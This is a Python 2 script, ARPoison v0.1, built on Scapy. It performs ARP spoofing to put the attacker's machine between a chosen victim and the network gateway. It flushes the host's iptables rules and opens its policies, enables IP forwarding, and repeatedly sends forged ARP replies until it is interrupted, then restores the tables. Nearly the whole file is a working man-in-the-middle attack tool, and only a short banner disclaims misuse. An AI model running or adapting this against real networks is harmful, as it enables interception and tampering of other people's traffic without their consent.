#!/usr/bin/python

import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *

import argparse
import signal
import sys
import time

debug=False

print "**********************************"
print "*** ARPoison v0.1"    
print "*** Support: arpoison@zarat.ml"    
print "*** powered by Python und Scapy" 
print "*** this software is for educational purposes only."
print "*** just penetrate networks that you own or have permission to."
print "*** i am not responsible for any misuse."    
print "**********************************"

# iptables einrichten. Vorher Backup machen
print "[info] saving iptables"
os.system("iptables-save > arpoison_iptables.backup")
os.system("iptables -F")
os.system("iptables -P INPUT ACCEPT")
os.system("iptables -P FORWARD ACCEPT")

def parse_args():

    parser = argparse.ArgumentParser()
    parser.add_argument("-v", "--victimIP", help="IP Adress des Opfers. Leer lassen um alle anzugreifen. Beispiel: -v 192.168.0.2")
    parser.add_argument("-r", "--routerIP", help="IP Adresse des Gateway. Beispiel: -r 192.168.0.1")
    return parser.parse_args()

def acknowledgement():

    print "\n1 Paket gesendet"    

def originalMAC(ip):

    ans,unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=3,verbose=debug)
    for s,r in ans:
        return r[Ether].src

def poison(routerIP, victimIP, routerMAC, victimMAC):
    print "[info] spoofing ARP table"
    sr(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC),verbose=debug)
    sr(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC),verbose=debug)
    acknowledgement

# iptables Backup wieder einspielen
def restore(routerIP, victimIP, routerMAC, victimMAC):

    print "[info] restoring ARP table"
    send(ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMAC), count=5,verbose=debug)
    send(ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=routerMAC), count=5,verbose=debug)
    time.sleep(2)
    print "[info] restoring iptables"
    os.system("iptables-restore < arpoison_iptables.backup")
    os.system("rm arpoison_iptables.backup")
    time.sleep(2)  
    sys.exit("[info] shutting down now")

def main(args):

    if os.geteuid() != 0:

        sys.exit("[!] please run as administrator")

    routerIP = args.routerIP
    victimIP = args.victimIP
    routerMAC = originalMAC(args.routerIP)
    victimMAC = originalMAC(args.victimIP)

    if routerMAC == None:

        sys.exit("[!] -r MAC not found")

    if victimMAC == None:

        sys.exit("[!] -v MAC not found")

    with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:

        ipf.write('1\n')
        print "[info] enable ip forwarding"
        time.sleep(2)

    def signal_handler(signal, frame):

        with open('/proc/sys/net/ipv4/ip_forward', 'w') as ipf:

            ipf.write('0\n')
            print "\n[info] disable ip forwarding" 
            time.sleep(2)          

        restore(routerIP, victimIP, routerMAC, victimMAC)

    signal.signal(signal.SIGINT, signal_handler)

    while 1:

        poison(routerIP, victimIP, routerMAC, victimMAC)
        time.sleep(1.5)

main(parse_args())
